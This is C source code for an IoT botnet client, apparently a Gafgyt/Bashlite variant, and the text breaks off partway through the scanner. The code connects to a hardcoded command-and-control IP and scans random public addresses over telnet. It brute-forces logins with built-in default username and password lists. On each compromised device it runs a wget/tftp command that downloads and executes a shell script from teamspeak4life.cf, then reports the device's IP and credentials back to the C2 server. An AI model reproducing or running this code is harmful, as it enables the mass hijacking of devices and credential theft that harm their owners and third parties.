//     ___      __ _
//    /   \___ / _(_)_ __   ___  ___
//   / /\ / _ \ |_| | '_ \ / _ \/ __|
//  / /_//  __/  _| | | | |  __/\__ \
// /___,' \___|_| |_|_| |_|\___||___/

#define PR_SET_NAME 15
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3

//   _____            _           _
//   \_   \_ __   ___| |_   _  __| | ___  ___
//    / /\/ '_ \ / __| | | | |/ _` |/ _ \/ __|
// /\/ /_ | | | | (__| | |_| | (_| |  __/\__ \
// \____/ |_| |_|\___|_|\__,_|\__,_|\___||___/

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>

//    ___             __ _
//   / __\___  _ __  / _(_) __ _
//  / /  / _ \| '_ \| |_| |/ _` |
// / /__| (_) | | | |  _| | (_| |
// \____/\___/|_| |_|_| |_|\__, |
//                         |___/

unsigned char *commServer[] =
{
        "185.112.249.43:213"
};

//    ___                 _
//   / __\   _ _ __   ___| |_(_) ___  _ __  ___
//  / _\| | | | '_ \ / __| __| |/ _ \| '_ \/ __|
// / /  | |_| | | | | (__| |_| | (_) | | | \__ \
// \/    \__,_|_| |_|\___|\__|_|\___/|_| |_|___/

int initConnection();
int getBogos(unsigned char *bogomips);
int getCores();
int getCountry(unsigned char *buf, int bufsize);
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);

//    ___ _       _           _
//   / _ \ | ___ | |__   __ _| |___
//  / /_\/ |/ _ \| '_ \ / _` | / __|
// / /_\\| | (_) | |_) | (_| | \__ \
// \____/|_|\___/|_.__/ \__,_|_|___/

int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint32_t scanPid;
uint64_t numpids = 0;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0", "cisco\0", "Administrator\0", "sa\0", "bbsd-client\0", "hsa\0", "cmaker\0", "netrangr\0", "CISCO15\0", "wlse\0", "wlseuser\0", "support"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "cisco\0", "letmein\0", "diamond\0", "changeme2\0", "NULL\0", "Cisco\0", "cmaker\0", "hsadb \0", "blender\0", "attack\0", "wlsedb\0", "wlsepassword\0", "dreambox\0", "support"};

//    ___  ___  __      __  ___
//   / __\/ _ \/__\  /\ \ \/ _ \
//  / _\ / /_)/ \// /  \/ / /_\/
// / /  / ___/ _  \/ /\  / /_\\
// \/   \/   \/ \_/\_\ \/\____/

#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}

//        _   _ _
//  /\ /\| |_(_) |___
// / / \ \ __| | / __|
// \ \_/ / |_| | \__ \
//  \___/ \__|_|_|___/

void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}

int zprintf(const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( 0, format, args );
}

int szprintf(unsigned char *out, const unsigned char *format, ...)
{
        va_list args;
        va_start( args, format );
        return print( &out, format, args );
}


int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        zprintf("buf: %s\n", orig);
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

static int *fdopen_pids;

int fdpopen(unsigned char *program, register unsigned char *type)
{
        register int iop;
        int pdes[2], fds, pid;

        if (*type != 'r' && *type != 'w' || type[1]) return -1;

        if (pipe(pdes) < 0) return -1;
        if (fdopen_pids == NULL) {
                if ((fds = getdtablesize()) <= 0) return -1;
                if ((fdopen_pids = (int *)malloc((unsigned int)(fds * sizeof(int)))) == NULL) return -1;
                memset((unsigned char *)fdopen_pids, 0, fds * sizeof(int));
        }

        switch (pid = vfork())
        {
        case -1:
                close(pdes[0]);
                close(pdes[1]);
                return -1;
        case 0:
                if (*type == 'r') {
                        if (pdes[1] != 1) {
                                dup2(pdes[1], 1);
                                close(pdes[1]);
                        }
                        close(pdes[0]);
                } else {
                        if (pdes[0] != 0) {
                                (void) dup2(pdes[0], 0);
                                (void) close(pdes[0]);
                        }
                        (void) close(pdes[1]);
                }
                execl("/bin/sh", "sh", "-c", program, NULL);
                _exit(127);
        }
        if (*type == 'r') {
                iop = pdes[0];
                (void) close(pdes[1]);
        } else {
                iop = pdes[1];
                (void) close(pdes[0]);
        }
        fdopen_pids[iop] = pid;
        return (iop);
}

int fdpclose(int iop)
{
        register int fdes;
        sigset_t omask, nmask;
        int pstat;
        register int pid;

        if (fdopen_pids == NULL || fdopen_pids[iop] == 0) return (-1);
        (void) close(iop);
        sigemptyset(&nmask);
        sigaddset(&nmask, SIGINT);
        sigaddset(&nmask, SIGQUIT);
        sigaddset(&nmask, SIGHUP);
        (void) sigprocmask(SIG_BLOCK, &nmask, &omask);
        do {
                pid = waitpid(fdopen_pids[iop], (int *) &pstat, 0);
        } while (pid == -1 && errno == EINTR);
        (void) sigprocmask(SIG_SETMASK, &omask, NULL);
        fdopen_pids[fdes] = 0;
        return (pid == -1 ? -1 : WEXITSTATUS(pstat));
}

unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}

static const long hextable[] = {
        [0 ... 255] = -1,
        ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
        ['A'] = 10, 11, 12, 13, 14, 15,
        ['a'] = 10, 11, 12, 13, 14, 15
};

long parseHex(unsigned char *hex)
{
        long ret = 0;
        while (*hex && ret >= 0) ret = (ret << 4) | hextable[*hex++];
        return ret;
}

int wildString(const unsigned char* pattern, const unsigned char* string) {
        switch(*pattern)
        {
        case '\0': return *string;
        case '*': return !(!wildString(pattern+1, string) || *string && !wildString(pattern, string+1));
        case '?': return !(*string && !wildString(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !wildString(pattern+1, string+1));
        }
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void uppercase(unsigned char *str)
{
        while(*str) { *str = toupper(*str); str++; }
}

int getBogos(unsigned char *bogomips)
{
        int cmdline = open("/proc/cpuinfo", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                uppercase(linebuf);
                if(strstr(linebuf, "BOGOMIPS") == linebuf)
                {
                        unsigned char *pos = linebuf + 8;
                        while(*pos == ' ' || *pos == '\t' || *pos == ':') pos++;
                        while(pos[strlen(pos)-1] == '\r' || pos[strlen(pos)-1] == '\n') pos[strlen(pos)-1]=0;
                        if(strchr(pos, '.') != NULL) *strchr(pos, '.') = 0x00;
                        strcpy(bogomips, pos);
                        close(cmdline);
                        return 0;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);
        return 1;
}

int getCores()
{
        int totalcores = 0;
        int cmdline = open("/proc/cpuinfo", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                uppercase(linebuf);
                if(strstr(linebuf, "BOGOMIPS") == linebuf) totalcores++;
                memset(linebuf, 0, 4096);
        }
        close(cmdline);
        return totalcores;

}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);

        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        sockprintf(mainCommSock, "PING");

                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }

                        break;
                }
        }

        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;

        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;

//      zprintf("recv: %s\n", cp);

        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}

int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

int negotiate(int sock, unsigned char *buf, int len)
{
        unsigned char c;

        switch (buf[1]) {
        case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
        case CMD_WILL:
        case CMD_WONT:
        case CMD_DO:
        case CMD_DONT:
                c = CMD_IAC;
                send(sock, &c, 1, MSG_NOSIGNAL);
                if (CMD_WONT == buf[1]) c = CMD_DONT;
                else if (CMD_DONT == buf[1]) c = CMD_WONT;
                else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
                else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
                send(sock, &c, 1, MSG_NOSIGNAL);
                send(sock, &(buf[2]), 1, MSG_NOSIGNAL);
                break;

        default:
                break;
        }

        return 0;
}

int matchPrompt(char *bufStr)
{
        char *prompts = ":>%$#\0";

        int bufLen = strlen(bufStr);
        int i, q = 0;
        for(i = 0; i < strlen(prompts); i++)
        {
                while(bufLen > q && (*(bufStr + bufLen - q) == 0x00 || *(bufStr + bufLen - q) == ' ' || *(bufStr + bufLen - q) == '\r' || *(bufStr + bufLen - q) == '\n')) q++;
                if(*(bufStr + bufLen - q) == prompts[i]) return 1;
        }

        return 0;
}

int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutusec, char *buffer, int bufSize, int initialIndex)
{
        int bufferUsed = initialIndex, got = 0, found = 0;
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = timeout;
        tv.tv_usec = timeoutusec;
        unsigned char *initialRead = NULL;

        while(bufferUsed + 2 < bufSize && (tv.tv_sec > 0 || tv.tv_usec > 0))
        {
                FD_ZERO(&myset);
                FD_SET(fd, &myset);
                if (select(fd+1, &myset, NULL, NULL, &tv) < 1) break;
                initialRead = buffer + bufferUsed;
                got = recv(fd, initialRead, 1, 0);
                if(got == -1 || got == 0) return 0;
                bufferUsed += got;
                if(*initialRead == 0xFF)
                {
                        got = recv(fd, initialRead + 1, 2, 0);
                        if(got == -1 || got == 0) return 0;
                        bufferUsed += got;
                        if(!negotiate(fd, initialRead, 3)) return 0;
                } else {
                        if(strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) { found = 1; break; }
                }
        }

        if(found) return 1;
        return 0;
}

//   _____  ___         _   _ _
//   \_   \/ _ \  /\ /\| |_(_) |___
//    / /\/ /_)/ / / \ \ __| | / __|
// /\/ /_/ ___/  \ \_/ / |_| | \__ \
// \____/\/       \___/ \__|_|_|___/

static uint8_t ipState[5] = {0}; //starting from 1 becuz yolo
in_addr_t getRandomPublicIP()
{
        if(ipState[1] > 0 && ipState[4] < 255)
        {
                ipState[4]++;
                char ip[16] = {0};
                szprintf(ip, "%d.%d.%d.%d", ipState[1], ipState[2], ipState[3], ipState[4]);
                return inet_addr(ip);
        }

        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
        ipState[4] = 0;
        while(
                (ipState[1] == 0) ||
                (ipState[1] == 10) ||
                (ipState[1] == 100 && (ipState[2] >= 64 && ipState[2] <= 127)) ||
                (ipState[1] == 127) ||
                (ipState[1] == 169 && ipState[2] == 254) ||
                (ipState[1] == 172 && (ipState[2] <= 16 && ipState[2] <= 31)) ||
                (ipState[1] == 192 && ipState[2] == 0 && ipState[3] == 2) ||
                (ipState[1] == 192 && ipState[2] == 88 && ipState[3] == 99) ||
                (ipState[1] == 192 && ipState[2] == 168) ||
                (ipState[1] == 198 && (ipState[2] == 18 || ipState[2] == 19)) ||
                (ipState[1] == 198 && ipState[2] == 51 && ipState[3] == 100) ||
                (ipState[1] == 203 && ipState[2] == 0 && ipState[3] == 113) ||
                (ipState[1] >= 224)
        )
        {
                ipState[1] = rand() % 255;
                ipState[2] = rand() % 255;
                ipState[3] = rand() % 255;
        }

        char ip[16] = {0};
        szprintf(ip, "%d.%d.%d.0", ipState[1], ipState[2], ipState[3]);
        return inet_addr(ip);
}

in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int sclose(int fd)
{
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
//  _____     _            _     __                                   _      _
// /__   \___| |_ __   ___| |_  / _\ ___ __ _ _ __  _ __   ___ _ __  | | ___| |
//   / /\/ _ \ | '_ \ / _ \ __| \ \ / __/ _` | '_ \| '_ \ / _ \ '__| | |/ _ \ |
//  / / |  __/ | | | |  __/ |_  _\ \ (_| (_| | | | | | | |  __/ |    | |  __/ |
//  \/   \___|_|_| |_|\___|\__| \__/\___\__,_|_| |_|_| |_|\___|_|    |_|\___|_|

void StartTheLelz(int nothing)
{
        int max = (getdtablesize() / 4) * 3, i, res;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;
        int valopt;

        max = max > 512 ? 512 : max;

        struct sockaddr_in dest_addr;
        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(23);
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        struct telstate_t
        {
                int fd;
                uint32_t ip;
                uint8_t state;
                uint8_t complete;
                uint8_t usernameInd;
                uint8_t passwordInd;
                uint32_t totalTimeout;
                uint16_t bufUsed;
                char *sockbuf;
        } fds[max];
        memset(fds, 0, max * (sizeof(int) + 1));
        for(i = 0; i < max; i++) { fds[i].complete = 1; fds[i].sockbuf = malloc(1024); memset(fds[i].sockbuf, 0, 1024); }
    	struct timeval timeout;
    	timeout.tv_sec = 5;
    	timeout.tv_usec = 0;
        while(1)
        {
                for(i = 0; i < max; i++)
                {
                        switch(fds[i].state)
                        {
                        case 0:
                                {
                                        memset(fds[i].sockbuf, 0, 1024);

                                        if(fds[i].complete) { char *tmp = fds[i].sockbuf; memset(&(fds[i]), 0, sizeof(struct telstate_t)); fds[i].sockbuf = tmp; fds[i].ip = getRandomPublicIP(); }
                                        else {
                                                fds[i].passwordInd++;
                                                if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) { fds[i].passwordInd = 0; fds[i].usernameInd++; }
                                                if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) { fds[i].complete = 1; continue; }
                                        }
                                        dest_addr.sin_family = AF_INET;
                                        dest_addr.sin_port = htons(23);
                                        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                                        dest_addr.sin_addr.s_addr = fds[i].ip;
                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                                        setsockopt (fds[i].fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
                                        setsockopt (fds[i].fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
                                        if(fds[i].fd == -1) { continue; }
                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) { /*printf("close %lu\n",fds[i].ip);*/ sclose(fds[i].fd); fds[i].complete = 1; }
                                        else { fds[i].state = 1; fds[i].totalTimeout = 0; }
                                }
                                break;

                        case 1:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        FD_ZERO(&myset);
                                        FD_SET(fds[i].fd, &myset);
                                        tv.tv_sec = 0;
                                        tv.tv_usec = 10000;
                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
                                        if(res == 1)
                                        {
                                                lon = sizeof(int);
                                                valopt = 0;
                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                                if(valopt)
                                                {
                                                        sclose(fds[i].fd);
                                                        fds[i].state = 0;
                                                        fds[i].complete = 1;
                                                } else {
                                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
                                                        fds[i].totalTimeout = 0;
                                                        fds[i].bufUsed = 0;
                                                        memset(fds[i].sockbuf, 0, 1024);
                                                        fds[i].state = 2;
                                                        continue;
                                                }
                                        } else if(res == -1)
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }

                                        if(fds[i].totalTimeout + 5 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

                        case 2:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        if(readUntil(fds[i].fd, "ogin:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
                                                memset(fds[i].sockbuf, 0, 1024);
                                                fds[i].state = 3;
                                                continue;
                                        } else {
                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
                                        }

                                        if(fds[i].totalTimeout + 30 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

                        case 3:
                                {
                                        if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 4;
                                }
                                break;

                        case 4:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        if(readUntil(fds[i].fd, "assword:", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
                                                if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
                                                else fds[i].state = 100;
                                                memset(fds[i].sockbuf, 0, 1024);
                                                continue;
                                        } else {
                                                if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
                                        }

                                        if(fds[i].totalTimeout + 8 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

                        case 5:
                                {
                                        if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 6;
                                }
                                break;

                        case 6:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        if(readUntil(fds[i].fd, "ncorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
                                                if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
                                                if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                                else fds[i].state = 7;
                                                memset(fds[i].sockbuf, 0, 1024);
                                                continue;
                                        } else {
                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
                                        }

                                        if(fds[i].totalTimeout + 30 < time(NULL))
                                        {
                                                sclose(fds[i].fd);
                                                fds[i].state = 0;
                                                fds[i].complete = 1;
                                        }
                                }
                                break;

                        case 7:
                                {
                                        if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 8;
                                }
                                break;

                        case 8:
                                {
                                        if(send(fds[i].fd, "cd /tmp || cd /var/run;rm -f *;wget http://teamspeak4life.cf/gtop.sh || busybox wget http://teamspeak4life.cf/gtop.sh; sh gtop.sh; rm -f *.sh;tftp teamspeak4life.cf -c get tftp.sh;sh tftp.sh;rm -rf tftp.sh\r\n", 207, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 9;
                                }
                                break;

                        case 9:
                                {
                                        if(send(fds[i].fd, "/bin/busybox;echo -e '\x67\x61\x79\x66\x67\x74'\r\n", 49, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;

                        case 10:
                                {
                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);

                                        if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
                                                sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
												sockprintf(mainCommSock, "VULN FOUND!");
                                                continue;

                                        }
					else if(readUntil(fds[i].fd, "gayfgt", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
